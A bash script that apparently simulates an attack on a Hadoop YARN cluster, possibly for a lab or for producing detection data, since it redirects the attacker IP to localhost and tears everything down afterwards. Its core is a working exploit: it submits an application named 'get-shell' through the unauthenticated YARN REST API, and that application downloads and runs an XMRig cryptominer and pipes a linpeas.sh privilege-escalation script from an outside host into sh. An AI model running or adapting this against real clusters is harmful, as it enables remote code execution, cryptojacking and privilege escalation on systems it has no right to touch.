#!/bin/bash

RANDOM_ID=$(head /dev/urandom | tr -dc 0-9 | head -c 13)
RANDOM_TMP_DIR="/tmp/$RANDOM_ID"
mkdir $RANDOM_TMP_DIR
cp /bin/wget $RANDOM_TMP_DIR/wget
sudo chown -R ubuntu:ubuntu $RANDOM_TMP_DIR

curl --header "Content-Type: application/json"   --request POST   --data '{"am-container-spec": {"commands": {"command": "'"$RANDOM_TMP_DIR/wget"'  http://203.0.113.1:33333/ls -O '"$RANDOM_TMP_DIR/xmrig; chmod +x $RANDOM_TMP_DIR/xmrig; $RANDOM_TMP_DIR/xmrig"' > /tmp/log; '"$RANDOM_TMP_DIR/wget"' http://203.0.113.1:33333/linpeas.sh | sh"}}, "application-id": "application_'"$RANDOM_ID"'_1274", "application-type": "YARN", "application-name": "get-shell"}'   http://localhost:8088/ws/v1/cluster/apps

curl http://localhost:8088/ws/v1/cluster/apps

echo
echo
echo "Sleeping for 5 mins to allow the Hadoop job to complete..."
sleep 300

sudo -u ubuntu bash << 'EOF'
echo "Shutting down Hadoop services..."

HADOOP_HOME=/usr/local/hadoop-3.3.6

$HADOOP_HOME/sbin/stop-dfs.sh

$HADOOP_HOME/sbin/stop-yarn.sh

$HADOOP_HOME/sbin/mr-jobhistory-daemon.sh stop historyserver

sudo rm -rf $HADOOP_HOME

echo "Removing IPTables NAT rules..."
sudo iptables -t nat -D OUTPUT -d 203.0.113.1 -p tcp --dport 33333 -j DNAT --to-destination 127.0.0.1:8081
sudo iptables -t nat -D OUTPUT -d 203.0.113.1 -p tcp --dport 4444 -j DNAT --to-destination 127.0.0.1:4444
EOF
